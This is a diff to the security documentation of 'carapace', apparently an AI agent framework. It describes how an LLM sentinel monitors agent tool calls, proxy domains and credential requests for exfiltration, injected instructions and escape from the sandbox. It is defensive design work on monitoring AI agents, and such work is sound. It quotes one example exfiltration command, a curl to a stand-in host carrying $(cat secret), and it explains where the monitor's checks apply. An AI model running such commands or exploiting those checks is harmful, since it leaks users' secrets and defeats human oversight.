@@ -6,7 +6,7 @@ carapace gates every agent action through a two-layer security system: a fast **
 
 Every tool call and skill invocation passes through the security module before execution:
 
-1. **Safe-list check.** A hardcoded set of tool names is auto-allowed without any LLM call. carapace also applies a narrow read-only `exec` heuristic and a narrow exact-domain proxy heuristic for obviously harmless cases.
+1. **Safe-list check.** A hardcoded set of tool names is auto-allowed without any LLM call. carapace also applies a narrow read-only `exec` heuristic for obviously harmless cases.
 2. **Sentinel evaluation.** All other operations are sent to the sentinel agent -- an LLM that receives the action log, the tool name and arguments, and makes a contextual decision.
 3. **Verdict.** The sentinel is a guard rail, not a reviewer of the agent's work: it stops the agent from going haywire beyond the sandbox, changing what it was not asked to change, exfiltrating data, or following injected instructions, and lets everything else through. It returns one of four decisions:
    - **allow** -- proceed without interruption, optionally with a comment for the agent (see [Sentinel comments](#sentinel-comments)).
@@ -46,7 +46,7 @@ When the sentinel allows a tool call or git push, it can add a `comment` (at mos
 
 `SessionSecurity` collects the comments, and `SentinelCommentCapability` puts them into the agent's next model request as a `SystemPromptPart`, right after the tool results. A comment on a push made by an `exec` arrives the same way, after that `exec`'s result. The system voice matters: tool output is untrusted and could forge a comment, and a user prompt part would read as the user speaking. Models with inline system messages (OpenAI, Codex, newer Claude models) get a `system` entry; for the others (e.g. Claude Sonnet 4.6) pydantic-ai sends `<system>`-tagged text in the user turn, and pydantic-ai picks the rendering per model. The comment is appended, so the cached prefix stays intact; for the tag explanation pydantic-ai adds to the standing prompt, see [persistent-context.md](persistent-context.md#prefix-caching).
 
-An output validator rejects a comment on any other verdict, and on proxy domain and credential requests, where nothing reaches the agent. The UI and Matrix show the comment on the tool call (`approval_comment`).
+An output validator rejects a comment on any other verdict, and on proxy domain and credential requests, where only the verdict and its explanation go back to the command that asked (see [Boundary requests](#boundary-requests)). The UI and Matrix show the comment on the tool call (`approval_comment`).
 
 ## SECURITY.md -- the policy file
 
@@ -60,10 +60,10 @@ The shipped default policy (see `src/carapace/assets/SECURITY.md`) covers:
 - **Sandbox and layered defense** -- local `exec` is judged in context; network and Git push provide a second line of defense, but obviously malicious commands should still be stopped early.
 - **Network (proxy)** -- TLS hides everything except the domain; higher bar for outbound than inbound; judge plausibility from the triggering command and conversation.
 - **Skill activation** -- permissive `use_skill`; lighter touch when the skill injects no credentials; skill-declared vault paths are covered by `use_skill` approval (no extra prompt by design).
-- **Credentials** -- explicit sandbox vault access must fit the user’s task; deny exfiltration-style patterns; secrets must never be echoed or logged in plain text.
+- **Credentials** -- explicit sandbox vault access, including listing and searching credentials, must fit the user’s task; deny exfiltration-style patterns; secrets must never be echoed or logged in plain text.
 - **Git push** -- always escalate when `USER.md`, `SOUL.md`, `AGENTS.md`, or `SECURITY.md` change; other files may be allowed when the chat clearly shows user intent. Committing and pushing a change the user requested or approved is part of that request. An `exec` that commits and pushes the knowledge repo is not escalated for the push alone, since the push gets its own review with the actual diff.
 - **Autonomy** -- slightly more care after long unsupervised stretches or fresh external content, without escalating every harmless step.
-- **Proxy domain requests** -- plausibility pass on domains after the tool call that triggered the connection was already evaluated.
+- **Proxy domain requests** -- a decision of their own: no earlier review covers a domain, even one written in the command; judge it against the task and the commands that ran.
 
 Edit `SECURITY.md` to customize the policy for your setup. The sentinel will immediately pick up changes on the next session.
 
@@ -82,12 +82,9 @@ The following tools are auto-allowed without consulting the sentinel:
 
 `use_skill` is **not** safe-listed: activating a skill (copy into sandbox, optional venv sync, credential injection) is evaluated by the sentinel like other gated tools.
 
-Two additional fast paths are worth knowing about:
+Some `exec` calls are also auto-allowed by a read-only heuristic when they match known harmless command patterns. That path still emits audit entries with `approval_source="safe-list"`; it is not a silent bypass.
 
-- Some `exec` calls are auto-allowed by a read-only heuristic when they match known harmless command patterns.
-- Some proxy-domain checks are auto-allowed when the exact domain already appears in an approved `exec` command.
-
-Those paths still emit audit entries with `approval_source="safe-list"`; they are not silent bypasses.
+Domain and credential requests have no such fast path: a domain is reviewed even when it appears literally in the `exec` command, because a command like `curl "https://anything.example/?d=$(cat secret)"` names its destination too.
 
 The safe-list is defined in `src/carapace/security/__init__.py`.
 
@@ -156,13 +153,26 @@ This action log is distinct from both runtime session transcripts:
 - `events.yaml` stores the user-facing session transcript and operational events used by the UI, retry/reset/fork flows, and knowledge export.
 - `audit.yaml` stores security decisions and sentinel verdicts for auditability.
 
+## Boundary requests
+
+Requests that cross the sandbox boundary while a command runs, a domain at the proxy, a credential through `ccred` or everything a command declares up front with `cgate request`, are decisions of their own, not a plausibility check behind an already reviewed `exec`. The sentinel is told so in its instructions.
+
+- **What the sentinel sees.** The usual action log update: every entry since its last decision, which includes the `exec` calls that ran since then, followed by the request and the command that is running. A later request of the same `exec` is a short follow-up instead: what it adds, without repeating the command. The first request of every `exec` shows its command.
+- **Up-front requests.** `cgate request` asks for domains and credentials together and gets one verdict for all of them. A declaration carries no trust; the sentinel also sees the caller's store path and whether it matches the build for the current head (unknown until skills are built by the builder). See [sandbox.md](sandbox.md#declaring-needs-up-front-cgate) for the CLI.
+- **What the caller gets back.** The verdict and the sentinel's (or the user's) explanation. The proxy answers a denied domain with `403 Forbidden` and the explanation as a plain-text body; `ccred` and `cgate` print a denial on stderr and exit with status 1. The command decides how to continue; the `exec` is not aborted from outside. `revise` and comments are not offered here.
+  For HTTPS the 403 answers the `CONNECT`, and common clients drop its body: curl reports `CONNECT tunnel failed, response 403`, Python requests `Tunnel connection failed: 403 Forbidden`. Only plain HTTP clients reliably see the explanation, so do not build on it for HTTPS.
+- **Scope of an approval.** An approved domain or credential is free for the rest of that `exec` and not beyond. A credential approval covers the representation that was reviewed: a second `ccred get` for the same vault path in the same form returns without another review, `--json` after an approved password is reviewed again, and the next `exec` asks again. An approved `ccred list` or `ccred search` covers further listings in that `exec`. Only the first request is recorded; repeats within the `exec` leave no new UI, action log or audit entry.
+- **Late decisions.** A review can take minutes when it escalates to the user, and the `exec` may end meanwhile (a backgrounded `curl … &`, a timeout). A decision that comes back after its `exec` ended is not granted, neither to leftover processes nor to a later `exec`; the caller gets a denial.
+- **Outside an exec.** A request while no `exec` is running comes from a process an earlier call left behind. Carapace refuses it without asking the sentinel.
+- **Escalation.** The sentinel can escalate any of these to the user, who sees the request in the web UI, Matrix or the CLI. An up-front request shows as an "Access Request" with its domains and credentials.
+
 ## Credential access
 
 Credential access is mediated through the sandbox API and session state:
 
 - Sandbox scripts use `ccred` (or direct HTTP) to call `GET /credentials` and `GET /credentials/{vault_path}`.
-- `list` / `search` expose metadata only and are security-reviewed at the `exec` tool-call layer.
-- `fetch` is per-session approval-based: if a credential is not yet approved for the session, carapace sends a credential approval request and blocks until approve/deny.
+- `list` / `search` expose metadata only (names, vault paths, descriptions), but they enumerate the vault, so they are boundary requests like `get` (see [Boundary requests](#boundary-requests)).
+- `get` is reviewed per `exec`: unless the credential was approved earlier in the same `exec`, or a skill context covers it, carapace asks the sentinel and blocks until it or the user decides.
 - Approved credential metadata is tracked via context grants in `SessionState.context_grants` and reflected in `/session`.
 - Credential access decisions are recorded as `CredentialAccessEntry` action-log events.
 
@@ -185,12 +195,13 @@ Every security decision is written to a per-session audit log file at `$CARAPACE
 
 ## Proxy domain requests
 
-When a sandboxed container makes a network request, the proxy intercepts it and routes the domain to the security module. The sentinel evaluates whether the domain makes sense given the approved tool call that triggered it:
+When a sandboxed container makes a network request, the proxy intercepts it and routes the domain to the security module. The sentinel decides whether this command may talk to that host, given the task and the commands that ran:
 
 - A `curl` to `api.github.com` when running a git command → expected.
 - A Python script connecting to an unrelated domain not mentioned in the task → suspicious.
+- A domain that appears in the command is no reason to allow it by itself: the command may carry data to it.
 
-The sentinel's system prompt explicitly tells it that the tool call itself was already approved -- domain checks are a plausibility/safety-net layer, not a second full evaluation.
+A denied request gets a `403 Forbidden` whose body carries the explanation (see [Boundary requests](#boundary-requests)).
 
 Where the sandbox network isolation is enforced (Docker's internal network, or on Kubernetes a NetworkPolicy the CNI enforces), the sandbox cannot resolve names, so a DNS lookup cannot carry data past the proxy and its domain checks; see [No DNS from the sandbox](sandbox.md#no-dns-from-the-sandbox).
 
